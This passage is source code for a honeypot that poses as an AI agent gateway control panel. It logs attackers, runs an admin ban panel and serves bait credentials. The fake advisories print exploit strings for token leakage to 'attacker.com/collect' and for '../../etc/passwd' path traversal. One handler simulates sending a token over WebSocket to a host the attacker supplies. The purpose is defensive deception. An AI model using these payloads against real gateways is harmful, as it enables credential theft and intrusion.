          <div class="ch-icon" style="background:#5865f2"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.08.114 18.1.133 18.114a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Discord</div><div class="ch-detail">My Homelab</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#4a154b"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M5.042 15.165a2.528 2.528 0 0 1-2.52 2.523A2.528 2.528 0 0 1 0 15.165a2.527 2.527 0 0 1 2.522-2.52h2.52v2.52zm1.271 0a2.527 2.527 0 0 1 2.521-2.52 2.527 2.527 0 0 1 2.521 2.52v6.313A2.528 2.528 0 0 1 8.834 24a2.528 2.528 0 0 1-2.521-2.522v-6.313zM8.834 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 8.834 0a2.528 2.528 0 0 1 2.521 2.522v2.52H8.834zm0 1.271a2.528 2.528 0 0 1 2.521 2.521 2.528 2.528 0 0 1-2.521 2.521H2.522A2.528 2.528 0 0 1 0 8.834a2.528 2.528 0 0 1 2.522-2.521h6.312zm10.122 2.521a2.528 2.528 0 0 1 2.522-2.521A2.528 2.528 0 0 1 24 8.834a2.528 2.528 0 0 1-2.522 2.521h-2.522V8.834zm-1.268 0a2.528 2.528 0 0 1-2.523 2.521 2.527 2.527 0 0 1-2.52-2.521V2.522A2.527 2.527 0 0 1 15.165 0a2.528 2.528 0 0 1 2.523 2.522v6.312zm-2.523 10.122a2.528 2.528 0 0 1 2.523 2.522A2.528 2.528 0 0 1 15.165 24a2.527 2.527 0 0 1-2.52-2.522v-2.522h2.52zm0-1.268a2.527 2.527 0 0 1-2.52-2.523 2.526 2.526 0 0 1 2.52-2.52h6.313A2.527 2.527 0 0 1 24 15.165a2.528 2.528 0 0 1-2.522 2.523h-6.313z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Slack</div><div class="ch-detail">homelab-workspace</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#3a76f0"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm0 4c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Signal</div><div class="ch-detail">+1 (555) &bull;&bull;&bull;-8832</div></div>
          <span class="badge b-ok">connected</span>
        </div>
      </div>

      <div class="sec-head">Gateway API</div>
      <div class="api-card">
        <div class="api-base">Base URL: http://claw.hxorz.com &nbsp;&nbsp;|&nbsp;&nbsp; WS: ws://claw.hxorz.com/ws &nbsp;&nbsp;|&nbsp;&nbsp; Token: <span style="color:var(--orange)">ocgw-Fk4aX9pZ2•••••••••••</span></div>
        <div class="ep-list">
          <a class="ep-row" href="/health"><span class="ep-method">GET</span><span class="ep-path">/health</span><span class="ep-tag tag-ok">ok</span></a>
          <a class="ep-row" href="/api/v1/status"><span class="ep-method">GET</span><span class="ep-path">/api/v1/status</span><span class="ep-tag tag-ok">ok</span></a>
          <a class="ep-row" href="/api/v1/sessions"><span class="ep-method">GET</span><span class="ep-path">/api/v1/sessions</span><span class="ep-tag tag-ok">auth</span></a>
          <a class="ep-row" href="/api/v1/channels"><span class="ep-method">GET</span><span class="ep-path">/api/v1/channels</span><span class="ep-tag tag-ok">auth</span></a>
          <a class="ep-row" href="/api/v1/config"><span class="ep-method">GET</span><span class="ep-path">/api/v1/config</span><span class="ep-tag tag-sens">sensitive</span></a>
          <a class="ep-row" href="/api/v1/keys"><span class="ep-method">GET</span><span class="ep-path">/api/v1/keys</span><span class="ep-tag tag-crit">critical</span></a>
          <a class="ep-row" href="/api/v1/shell/execute"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/shell/execute</span><span class="ep-tag tag-crit">elevated</span></a>
          <a class="ep-row" href="/v1/chat/completions"><span class="ep-method post">POST</span><span class="ep-path">/v1/chat/completions</span><span class="ep-tag tag-ok">openai-compat</span></a>
          <a class="ep-row" href="/api/v1/agent/memory/export"><span class="ep-method">GET</span><span class="ep-path">/api/v1/agent/memory/export</span><span class="ep-tag tag-crit">critical</span></a>
          <a class="ep-row" href="/api/v1/exec/execute"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/exec/execute</span><span class="ep-tag tag-crit">elevated</span></a>
          <a class="ep-row" href="/api/v1/agent/apply_patch"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/agent/apply_patch</span><span class="ep-tag tag-sens">sensitive</span></a>
        </div>
      </div>

      <div class="sec-head">Security Advisories</div>
      <div style="display:flex;flex-direction:column;gap:8px">
        <div style="background:var(--card);border:1px solid #7f1d1d;border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#dc2626;color:#fff;padding:2px 7px;border-radius:4px">CRITICAL</span>
            <span style="font-size:12px;font-weight:600;color:var(--red)">CVE-2026-25253</span>
            <span style="font-size:12px;color:var(--muted)">Remote Code Execution &mdash; gatewayUrl parameter token leakage</span>
            <span style="margin-left:auto;font-size:11px;color:#ef4444;font-weight:600">IN THE WILD</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.1.29 &nbsp;&bull;&nbsp; This instance: v${HONEYPOT_VERSION} &nbsp;&bull;&nbsp; Exploit: <code style="font-size:11px;color:var(--orange)">/?gatewayUrl=attacker.com/collect</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">GHSA-rchv-x836-w7xp</span>
            <span style="font-size:12px;color:var(--muted)">Auth token stored unencrypted in localStorage / URL params</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt;= 2026.3.2 &nbsp;&bull;&nbsp; Token key: <code style="font-size:11px;color:var(--orange)">ocgw_auth_token</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">CVE-2026-28464</span>
            <span style="font-size:12px;color:var(--muted)">Path traversal via sessionId / sessionFile parameters</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.2.12 &nbsp;&bull;&nbsp; Exploit: <code style="font-size:11px;color:var(--orange)">?sessionId=../../etc/passwd</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#dc2626;color:#fff;padding:2px 7px;border-radius:4px">CRITICAL</span>
            <span style="font-size:12px;font-weight:600;color:var(--red)">CVE-2026-32060</span>
            <span style="font-size:12px;color:var(--muted)">Path traversal in apply_patch &mdash; arbitrary file write outside workdir</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.2.14 &nbsp;&bull;&nbsp; Endpoint: <code style="font-size:11px;color:var(--orange)">POST /api/v1/agent/apply_patch</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">CVE-2026-26319 &nbsp;|&nbsp; CVE-2026-28470</span>
            <span style="font-size:12px;color:var(--muted)">Webhook no-auth &amp; Exec Approvals allowlist bypass</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt;= 2026.2.13 &nbsp;&bull;&nbsp; Endpoints: <code style="font-size:11px;color:var(--orange)">/webhooks/telnyx</code> &nbsp;<code style="font-size:11px;color:var(--orange)">/api/v1/exec/execute</code></div>
        </div>
      </div>
    </div>

    <!-- TAB: CHAT -->
    <div class="tab-panel" id="tab-chat">
      <div class="chat-feed">
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-wa">WhatsApp</span><span>+1 (555) &bull;&bull;&bull;-4521</span><span style="margin-left:auto">5 min ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Check my emails and summarize the unread ones</span>
<div class="tool-call">[tool: gmail.list_messages] query="is:unread" maxResults=10</div>
<span class="chat-agent">Agent: You have 5 unread emails:

1. "Q2 Budget Approval Needed" — sarah@company.com (2h ago)
   Action required: Review and approve by Friday

2. "PR #142 merged" — github@noreply.com (3h ago)
   feat: add kubernetes deployment merged by @devteam

3. "AWS Invoice Ready" — billing@aws.amazon.com (1d ago)
   Invoice #INV-2026-03-001: $234.56

4. "Dependabot alert" — security@github.com (1d ago)
   2 high severity vulnerabilities found in dependencies

5. "Team standup tomorrow 10am" — john@company.com (2d ago)
   Please confirm your attendance</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-tg">Telegram</span><span>@user_handle</span><span style="margin-left:auto">34 min ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Turn on the living room lights at 70%</span>
<div class="tool-call">[tool: hue.set_scene] room="Living Room" brightness=70</div>
<span class="chat-agent">Agent: Done. Living room lights are now on at 70% brightness.</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-dc">Discord</span><span>#ai-assistant</span><span style="margin-left:auto">1h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: /status</span>
<span class="chat-agent">Agent: Gateway v${HONEYPOT_VERSION} running | Model: claude-opus-4-5 | Thinking: medium | Messages today: 142 | Cost: $4.26 | Channels: 3/5 connected</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-wa">WhatsApp</span><span>+1 (555) &bull;&bull;&bull;-4521</span><span style="margin-left:auto">2h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: What's the weather forecast for San Francisco this week?</span>
<div class="tool-call">[tool: weather.forecast] location="San Francisco, CA" days=5</div>
<span class="chat-agent">Agent: San Francisco 5-day forecast:
Mon: Partly cloudy, 16°C / 9°C
Tue: Sunny, 18°C / 10°C
Wed: Foggy morning, 14°C / 9°C
Thu: Overcast, 13°C / 8°C
Fri: Rain, 12°C / 7°C</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-tg">Telegram</span><span>@user_handle</span><span style="margin-left:auto">3h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Remind me to call mom at 6pm today</span>
<div class="tool-call">[tool: cron.schedule] time="18:00" message="Call mom" once=true</div>
<span class="chat-agent">Agent: Reminder set for 6:00 PM today. I'll ping you on Telegram.</span></div>
        </div>
      </div>
    </div>

    <!-- TAB: SESSIONS -->
    <div class="tab-panel" id="tab-sessions">
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>Session ID</th><th>Model</th><th>Thinking</th><th>Messages</th><th>Tokens</th><th>Cost (USD)</th><th>Created</th><th>Last Active</th><th>Status</th><th>Actions</th></tr></thead>
          <tbody>
            <tr>
              <td><span style="font-family:monospace;font-size:12px;background:rgba(249,115,22,.1);color:var(--orange);padding:2px 7px;border-radius:4px">main</span></td>
              <td style="font-family:monospace;font-size:12px">claude-opus-4-5</td>
              <td>medium</td>
              <td>142</td>
              <td style="font-size:12px;color:var(--muted)">284,318</td>
              <td>$4.26</td>
              <td style="font-size:12px;color:var(--muted)">today 00:30</td>
              <td style="font-size:12px;color:var(--muted)">5 min ago</td>
              <td><span class="badge b-ok">active</span></td>
              <td style="font-size:12px"><a href="/api/v1/sessions" style="color:var(--muted);margin-right:8px">View</a><a href="/api/v1/sessions" style="color:var(--red)">Reset</a></td>
            </tr>
          </tbody>
        </table>
      </div>
      <div style="font-size:12px;color:var(--muted)">Session key: <code style="font-family:monospace;background:rgba(255,255,255,.05);padding:2px 6px;border-radius:4px">agent:main:main</code> &nbsp;|&nbsp; DM scope: main &nbsp;|&nbsp; Store: /root/.openclaw/agents/main/sessions/sessions.json</div>
    </div>

    <!-- TAB: CONFIG -->
    <div class="tab-panel" id="tab-config">
      <div class="cfg-warn">
        Warning: This view contains sensitive configuration. API keys are masked. Use <a href="/api/v1/config" style="color:var(--yellow);text-decoration:underline">View Raw</a> to see full values.
      </div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:12px">Config file: <code style="font-family:monospace;background:rgba(255,255,255,.05);padding:2px 6px;border-radius:4px">/root/.openclaw/openclaw.json</code></div>
      <div class="code-block">${escapeHtml(JSON.stringify({
  model: cfg.model, provider: cfg.provider,
  anthropicApiKey: maskKey(cfg.anthropicApiKey),
  openaiApiKey: maskKey(cfg.openaiApiKey),
  gateway: { port: cfg.gateway.port, bind: cfg.gateway.bind, hotReload: cfg.gateway.hotReload, auth: { token: maskKey(cfg.gateway.auth.token) } },
  agent: cfg.agent,
  channels: { whatsapp: { enabled: true, phone: '+1 (555) ***-4521', allowFrom: ['*'] }, telegram: { enabled: true, botToken: maskKey(cfg.channels.telegram.botToken), allowFrom: ['*'] }, discord: { enabled: true, token: maskKey(cfg.channels.discord.token), guildId: cfg.channels.discord.guildId }, slack: cfg.channels.slack, signal: cfg.channels.signal },
  skills: cfg.skills,
}, null, 2))}</div>
    </div>

    <!-- TAB: LOGS -->
    <div class="tab-panel" id="tab-logs">
      <div class="log-wrap">
        <div class="log-toolbar">
          <span style="font-size:12px;color:var(--muted)">gateway.log &nbsp;|&nbsp; /root/logs/gateway.log</span>
          <div style="display:flex;gap:8px"><button onclick="location.reload()">Refresh</button><a href="/api/v1/logs" style="padding:4px 12px;background:var(--card);border:1px solid var(--border);color:var(--muted);border-radius:6px;font-size:11px;text-decoration:none">Download</a></div>
        </div>
        <div class="log-body" id="log-body">
${[
  ['INF', `Gateway v${HONEYPOT_VERSION} starting on :18789`, '00:30:01.234'],
  ['INF', 'Loading config /root/.openclaw/openclaw.json', '00:30:01.891'],
  ['INF', 'Provider: anthropic (claude-opus-4-5)', '00:30:02.103'],
  ['INF', 'Channel whatsapp connecting...', '00:30:02.344'],
  ['INF', 'Channel whatsapp connected (+15554521)', '00:30:03.211'],
  ['INF', 'Channel telegram connecting...', '00:30:03.567'],
  ['INF', 'Channel telegram connected (@oc_assistant_bot)', '00:30:04.123'],
  ['INF', 'Channel discord connecting...', '00:30:04.456'],
  ['INF', 'Channel discord connected (My Homelab / 1249847563210854400)', '00:30:05.001'],
  ['WRN', 'Channel slack token refresh failed: 401 Unauthorized', '00:30:05.234'],
  ['ERR', 'Channel signal QR code expired, reconnection required', '00:30:05.567'],
  ['INF', 'Daemon heartbeat enabled (30s interval)', '00:30:05.890'],
  ['INF', 'Skills loaded: browser, gmail, github (14 total)', '00:30:06.123'],
  ['INF', `Gateway ready. Control UI: http://localhost:18789`, '00:30:06.234'],
  ['INF', '[whatsapp/main] Incoming from +15554521', '14:18:31.445'],
  ['INF', '[whatsapp/main] Agent started model=claude-opus-4-5 thinking=medium', '14:18:32.012'],
  ['INF', '[whatsapp/main] Tool: gmail.list_messages', '14:18:36.789'],
  ['INF', '[whatsapp/main] Agent done 342 tokens $0.015', '14:18:47.234'],
  ['INF', '[telegram/main] Incoming from @user_handle', '14:21:15.112'],
  ['INF', '[telegram/main] Agent done 218 tokens $0.009', '14:21:23.789'],
].map(([lvl,msg,ts]) => `<div class="log-line"><span class="log-ts">[2026-03-15 ${ts}]</span><span class="log-lvl-${lvl}">[${lvl}]</span><span style="color:${lvl==='INF'?'#8b949e':lvl==='WRN'?'#eab308':'#ef4444'};margin-left:4px">${escapeHtml(msg)}</span></div>`).join('\n')}
        </div>
      </div>
    </div>

    <!-- TAB: TERMINAL -->
    <div class="tab-panel" id="tab-terminal">
      <div class="term-wrap">
        <div class="term-bar">
          <div class="term-dot" style="background:#ff5f57"></div>
          <div class="term-dot" style="background:#ffbd2e"></div>
          <div class="term-dot" style="background:#28ca41"></div>
          <span class="term-title">openclaw-vps: shell [elevated]</span>
        </div>
        <div class="term-output" id="term-output">Last login: Fri Mar 13 21:14:33 2026 from 192.168.1.10
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com

OpenClaw Gateway v${HONEYPOT_VERSION} - Shell Access Enabled
Type 'help' for available commands.

<span class="t-prompt">root@openclaw-vps:~# </span></div>
        <div class="term-input-row">
          <span class="term-prompt-label">root@openclaw-vps:~#</span>
          <input type="text" id="term-input" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="Type a command...">
        </div>
      </div>
    </div>

    <!-- TAB: SKILLS -->
    <div class="tab-panel" id="tab-skills">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
        <div style="font-size:13px;color:var(--muted)">14 skills installed &mdash; 8 enabled</div>
        <a href="https://clawhub.openclaw.ai" target="_blank" style="padding:7px 14px;background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.25);border-radius:7px;font-size:13px;font-weight:500">Browse ClawHub</a>
      </div>
      <div class="skills-grid">
        ${[
          {id:'browser',name:'Browser Control',ver:'2.3.1',on:true,bundled:true},
          {id:'gmail',name:'Gmail',ver:'1.5.0',on:true,bundled:false},
          {id:'github',name:'GitHub',ver:'1.3.2',on:true,bundled:false},
          {id:'hue',name:'Philips Hue',ver:'1.2.0',on:true,bundled:false},
          {id:'spotify',name:'Spotify',ver:'1.1.4',on:true,bundled:false},
          {id:'obsidian',name:'Obsidian',ver:'1.0.8',on:true,bundled:false},
          {id:'twitter',name:'Twitter / X',ver:'1.0.3',on:false,bundled:false},
          {id:'notion',name:'Notion',ver:'1.1.0',on:true,bundled:false},
          {id:'calendar',name:'Google Calendar',ver:'1.2.1',on:true,bundled:false},
          {id:'weather',name:'Weather',ver:'1.0.5',on:true,bundled:false},
          {id:'news',name:'News',ver:'1.0.2',on:false,bundled:false},
          {id:'stocks',name:'Stocks',ver:'1.0.1',on:false,bundled:false},
          {id:'home-assistant',name:'Home Assistant',ver:'1.1.2',on:false,bundled:false},
          {id:'custom-api',name:'Custom API',ver:'0.9.4',on:true,bundled:false},
        ].map(s => `<div class="skill-card">
          <div class="skill-head"><span class="skill-name">${s.name}${s.bundled?' <span style="font-size:10px;color:var(--muted)">[bundled]</span>':''}</span><button class="skill-toggle ${s.on?'skill-on':'skill-off'}" title="${s.on?'Enabled':'Disabled'}"></button></div>
          <div style="font-size:11px;color:var(--muted)">v${s.ver} &nbsp;&mdash;&nbsp; <a href="/api/v1/skills" style="color:var(--muted);font-size:11px">uninstall</a></div>
        </div>`).join('')}
      </div>
    </div>

  </div><!-- end .content -->
</div><!-- end .main-wrap -->
</div><!-- end .layout -->

<footer>
  <div class="footer-inner">
    <span>OpenClaw Gateway v${HONEYPOT_VERSION} &mdash; Node v${FAKE_NODE_VERSION} &mdash; <a href="https://openclaw.ai" target="_blank" style="color:var(--muted)">openclaw.ai</a></span>
    <div class="bsz">
      <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      <span>Visitors: <span id="busuanzi_value_site_uv">-</span></span>
      <span>Views: <span id="busuanzi_value_site_pv">-</span></span>
    </div>
  </div>
</footer>

<script>
// GHSA-rchv-x836-w7xp: Gateway auth token stored in localStorage (unencrypted)
try {
  localStorage.setItem('ocgw_auth_token', 'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o');
  localStorage.setItem('ocgw_gateway_url', 'http://localhost:18789');
  localStorage.setItem('ocgw_version', '${HONEYPOT_VERSION}');
  localStorage.setItem('ocgw_anthropic_key', 'sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8');
  localStorage.setItem('ocgw_user_prefs', JSON.stringify({model:'claude-opus-4-5',theme:'dark',thinking:'medium',elevated:true}));
  sessionStorage.setItem('ocgw_session_token', 'sess-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2h');
} catch(_){}

// Tab navigation
document.querySelectorAll('.nav-item[data-tab]').forEach(function(link){
  link.addEventListener('click',function(e){
    e.preventDefault();
    const tab=this.dataset.tab;
    document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
    document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active');});
    this.classList.add('active');
    const panel=document.getElementById('tab-'+tab);
    if(panel){panel.classList.add('active');}
    if(tab==='terminal'){document.getElementById('term-input').focus();}
  });
});

// Terminal
(function(){
  const output=document.getElementById('term-output');
  const input=document.getElementById('term-input');
  const history=[];let histIdx=-1;

  function appendLine(text,cls){
    const d=document.createElement('div');
    if(cls)d.className=cls;
    d.textContent=text;
    output.appendChild(d);
    output.scrollTop=output.scrollHeight;
  }
  function appendHTML(html){
    const d=document.createElement('div');
    d.innerHTML=html;
    output.appendChild(d);
    output.scrollTop=output.scrollHeight;
  }

  input.addEventListener('keydown',async function(e){
    if(e.key==='Enter'){
      const cmd=this.value.trim();
      if(!cmd)return;
      history.unshift(cmd);histIdx=-1;
      appendHTML('<span class="t-prompt">root@openclaw-vps:~# </span><span class="t-cmd">'+escHtml(cmd)+'</span>');
      this.value='';
      try{
        const res=await fetch('/api/v1/shell/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd,session:'main'})});
        const data=await res.json();
        if(data.stdout){
          if(data.stdout==='__CLEAR__'){output.innerHTML='';return;}
          appendLine(data.stdout);
        }
        if(data.stderr) appendLine(data.stderr,'t-err');
      }catch(err){appendLine('Connection error: '+err.message,'t-err');}
      appendHTML('<span class="t-prompt">root@openclaw-vps:~# </span>');
    }else if(e.key==='ArrowUp'){
      e.preventDefault();histIdx=Math.min(histIdx+1,history.length-1);
      if(histIdx>=0)this.value=history[histIdx];
    }else if(e.key==='ArrowDown'){
      e.preventDefault();histIdx=Math.max(histIdx-1,-1);
      this.value=histIdx>=0?history[histIdx]:'';
    }
  });

  function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
})();
</script>
</body>
</html>`;
}


// ============================================================
// SECTION 10: ROUTE HANDLERS
// ============================================================
async function handleAdmin(request, env, url) {
  const path = url.pathname;
  const ip = getClientIP(request);

  if (path === '/admin/logout') {
    return new Response(null, { status: 302, headers: { Location: '/admin', 'Set-Cookie': 'admin_session=; Path=/admin; HttpOnly; SameSite=Strict; Max-Age=0' } });
  }

  const token = request.headers.get('Cookie')?.match(/admin_session=([a-f0-9]+)/)?.[1];
  const isAuth = await validateAdminSession(env, token);

  if (path === '/admin' || path === '/admin/') {
    if (isAuth) return new Response(null, { status: 302, headers: { Location: '/admin/dashboard' } });
    return new Response(htmlAdminLogin(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  }

  if (path === '/admin/login' && request.method === 'POST') {
    if (await isIPBanned(env, ip)) {
      return new Response(htmlAdminLogin('Your IP is banned due to too many failed attempts.'), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
    }
    const body = await request.formData().catch(() => new FormData());
    const pw = body.get('password') || '';
    const adminPw = env.ADMIN_PASSWORD || 'openclaw-local-dev-2024';
    if (pw === adminPw) {
      await recordAdminAttempt(env, ip, true);
      const t = await createAdminSession(env, ip);
      return new Response(null, { status: 302, headers: { Location: '/admin/dashboard', 'Set-Cookie': `admin_session=${t}; Path=/admin; HttpOnly; SameSite=Strict; Max-Age=3600` } });
    }
    await recordAdminAttempt(env, ip, false);
    const failed = await getRecentFailedAdminAttempts(env, ip);
    if (failed >= MAX_ADMIN_ATTEMPTS) {
      await banIP(env, ip, `Admin panel brute force: ${failed} failed attempts`);
      return new Response(htmlAdminLogin('Too many failed attempts. IP banned for 24 hours.'), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
    }
    return new Response(htmlAdminLogin('Incorrect password.', MAX_ADMIN_ATTEMPTS - failed), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  }

  if (!isAuth) return new Response(null, { status: 302, headers: { Location: '/admin' } });

  if (path === '/admin/dashboard') {
    const p = parseInt(url.searchParams.get('page') || '1', 10);
    const filters = { ip: url.searchParams.get('ip')||'', severity: url.searchParams.get('severity')||'ALL', type: url.searchParams.get('type')||'ALL', dateFrom: url.searchParams.get('dateFrom')||'', dateTo: url.searchParams.get('dateTo')||'' };
    const [st, ar, br] = await Promise.all([getAttackStats(env), getAttacks(env, p, filters), getIPBans(env)]);
    return new Response(htmlAdminDashboard(st, ar.rows, br, p, ar.pages, filters), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  }

  if (path === '/admin/ban' && request.method === 'POST') {
    const body = await request.formData().catch(() => new FormData());
    const tip = body.get('ip');
    if (tip) await banIP(env, tip, 'Manually banned by admin');
    return new Response(null, { status: 302, headers: { Location: '/admin/dashboard' } });
  }

  if (path === '/admin/unban' && request.method === 'POST') {
    const body = await request.formData().catch(() => new FormData());
    const tip = body.get('ip');
    if (tip) await unbanIPDB(env, tip);
    return new Response(null, { status: 302, headers: { Location: '/admin/dashboard' } });
  }

  if (path === '/admin/export') {
    const filters = { ip: url.searchParams.get('ip')||'', severity: url.searchParams.get('severity')||'ALL', type: url.searchParams.get('type')||'ALL', dateFrom: url.searchParams.get('dateFrom')||'', dateTo: url.searchParams.get('dateTo')||'' };
    let rows = [];
    try {
      const all = await env.DB.prepare(`SELECT id,ip,country,method,path,attack_types,severity,timestamp,user_agent FROM attacks ORDER BY created_at DESC LIMIT 1000`).all();
      rows = all.results || [];
    } catch(_){}
    const header = 'id,ip,country,method,path,attack_types,severity,timestamp,user_agent\n';
    const csv = rows.map(r => [r.id,r.ip,r.country,r.method,`"${(r.path||'').replace(/"/g,'""')}"`,`"${(r.attack_types||'').replace(/"/g,'""')}"`,r.severity,r.timestamp,`"${(r.user_agent||'').replace(/"/g,'""')}"`].join(',')).join('\n');
    return new Response(header+csv, { headers: { 'Content-Type': 'text/csv', 'Content-Disposition': `attachment; filename="honeypot-${new Date().toISOString().slice(0,10)}.csv"` } });
  }

  return new Response('Not Found', { status: 404 });
}

const OCFW_HEADERS = {
  'Content-Type': 'application/json',
  'Access-Control-Allow-Origin': '*',
  'X-OpenClaw-Version': HONEYPOT_VERSION,
  'X-Gateway-ID': 'ocgw-vps-prod-01',
  'X-Powered-By': `OpenClaw/${HONEYPOT_VERSION}`,
  'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' ws: wss: blob: data:; connect-src *",
  'X-Frame-Options': 'SAMEORIGIN',
};

async function handleHoneypot(request, env, url, ip, attackInfo) {
  const path = url.pathname;
  const uptimeMs = Date.now() - getFakeStartTime().getTime();
  const trap = TRAP_PATHS[path];

  const hdrs = (extra={}) => ({ ...OCFW_HEADERS, ...extra });
  const json = (data, status=200) => new Response(JSON.stringify(data), { status, headers: hdrs() });

  // CVE-2026-25253: gatewayUrl parameter — simulate token leakage to attacker-controlled endpoint
  const gatewayUrl = url.searchParams.get('gatewayUrl');
  if (gatewayUrl) {
    const fakeToken = 'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o';
    const fakeVer = HONEYPOT_VERSION;
    const authPayload = JSON.stringify({ type: 'auth', token: fakeToken, version: fakeVer, gateway_id: 'ocgw-vps-prod-01', ts: Date.now() });
    // Render a page that auto-connects to attacker's WebSocket, sending the token
    return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>OpenClaw Gateway</title></head><body>
<script>
(function(){
  var gwUrl = ${JSON.stringify(gatewayUrl)};
  var payload = ${authPayload};
  try {
    var wsUrl = gwUrl.replace(/^https?:\/\//,'wss://').replace(/^wss?:\/\//,'ws://');
    if(!/^wss?:\/\//i.test(gwUrl)) wsUrl = 'ws://' + gwUrl.replace(/.*:\/\//,'');
    var ws = new WebSocket(wsUrl + (wsUrl.indexOf('?')===-1?'?':'&') + 'token=' + payload.token);
    ws.onopen = function(){ ws.send(JSON.stringify(payload)); };
    ws.onerror = function(){
